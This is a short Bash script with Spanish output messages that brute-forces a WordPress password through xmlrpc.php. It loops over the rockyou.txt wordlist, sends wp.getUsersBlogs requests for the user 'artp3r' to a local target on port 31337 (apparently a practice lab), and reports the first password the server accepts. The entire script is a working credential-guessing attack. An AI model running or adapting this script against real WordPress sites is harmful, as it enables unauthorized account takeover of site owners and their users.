#!/bin/bash
# Wordpress user password abusing xmlrpc.php

function ctrl_c(){
	echo -e "\n\n[!] Saliendo...\n"
	exit 1
}

# Ctrl + C
trap ctrl_c SIGINT

function createXML(){
	password=$1
	
	xmlFile="""
	<?xml version=\"1.0\" encoding=\"utf-8\"?> 
	<methodCall> 
	<methodName>wp.getUsersBlogs</methodName> 
	<params>
	<param><value>artp3r</value></param>
	<param><value>$password</value></param>
	</params> 
	</methodCall>
	"""
	echo $xmlFile > file3.xml

	response=$(curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php" -d@file3.xml)

	if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
		echo -e "\n[+] La contraseña para el usuario artp3r es $password"
		exit 0
	fi

	sleep 0.1
}

echo -e "\nProbando contraseñas del diccionario rockyou.txt\n"

cat ~/Herramientas/rockyou.txt | while read password; do
	createXML $password
done
